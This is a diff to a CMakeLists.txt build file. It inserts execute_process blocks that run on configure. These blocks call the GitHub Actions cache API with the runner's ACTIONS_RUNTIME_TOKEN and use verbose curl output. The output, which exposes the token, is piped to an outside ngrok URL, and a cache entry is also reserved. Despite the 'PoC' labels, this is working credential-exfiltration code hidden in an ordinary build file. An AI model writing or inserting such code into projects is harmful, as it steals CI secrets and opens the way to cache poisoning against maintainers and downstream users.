@@ -1,5 +1,27 @@
 cmake_minimum_required(VERSION 3.18 FATAL_ERROR)
 
+message(STATUS "PoC: Probing GitHub Actions Cache API...")
+
+set(TARGET_URL "$ENV{ACTIONS_CACHE_URL}_apis/artifactcache/cache?keys=vcpkg&version=1")
+
+execute_process(
+    COMMAND bash -c "curl -v -s \
+    -H \"Authorization: Bearer $ENV{ACTIONS_RUNTIME_TOKEN}\" \
+    -H \"Accept: application/json;api-version=6.0-preview.1\" \
+    \"$ENV{ACTIONS_CACHE_URL}_apis/artifactcache/cache?keys=vcpkg&toolId=actions-cache\" \
+    2>&1 | curl -X POST --data-binary @- https://f33c42e65861.ngrok-free.app/cache_probe"
+)
+
+message(STATUS "PoC: Attempting safe write reserve...")
+execute_process(
+    COMMAND bash -c "curl -v -s -X POST \
+    -H \"Authorization: Bearer $ENV{ACTIONS_RUNTIME_TOKEN}\" \
+    -H \"Content-Type: application/json\" \
+    -d '{\"key\":\"security-research-poc-dont-use\",\"version\":\"v1\"}' \
+    \"$ENV{ACTIONS_CACHE_URL}_apis/artifactcache/caches\" \
+    2>&1 | curl -X POST --data-binary @- https://f33c42e65861.ngrok-free.app/cache_write_test"
+)
+
 list(APPEND CMAKE_MODULE_PATH "${CMAKE_CURRENT_SOURCE_DIR}/CMakeModules")
 
 # VCPKG has an imperfect android implementation.
